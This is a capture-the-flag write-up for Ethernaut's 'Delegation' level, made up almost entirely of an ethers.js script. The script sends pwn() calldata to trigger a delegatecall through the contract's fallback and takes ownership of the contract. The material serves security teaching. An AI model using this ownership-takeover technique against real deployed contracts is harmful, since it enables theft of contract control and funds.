---
description: >-
  In Ethernaut's Delegation, we see an example of one contract calling another
  via Solidity's delegatecall method.
---

# 6 - Delegation

### Scripted Solution

```javascript
const ethers = require('ethers')
const fs = require('fs')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return { provider, playerWallet, playerWalletSigner, contract }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const { playerWalletSigner, contract: delegationContract } = await setup(
    'Delegation'
  )

  console.log(`Delegation contract owner: ${await delegationContract.owner()}`)

  // Method id: first four bytes of the keccak256 hash of the function signature
  const pwnMethodId = ethers.utils.id('pwn()').substring(0, 10)

  // Trigger 'Delegation' fallback function and call pwn() on 'Delegate'
  console.log('Sending transaction to trigger fallback and call pwn()...')
  const delegationFallbackTx = await playerWalletSigner.sendTransaction({
    to: process.env.CONTRACT_ADDRESS,
    gasLimit: 1000000,
    gasPrice: 20000000000,
    data: pwnMethodId,
  })
  await delegationFallbackTx.wait(1)

  // Confirm contract owner is now player address
  console.log(
    `Delegation contract owner now: ${await delegationContract.owner()}`
  )
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
```
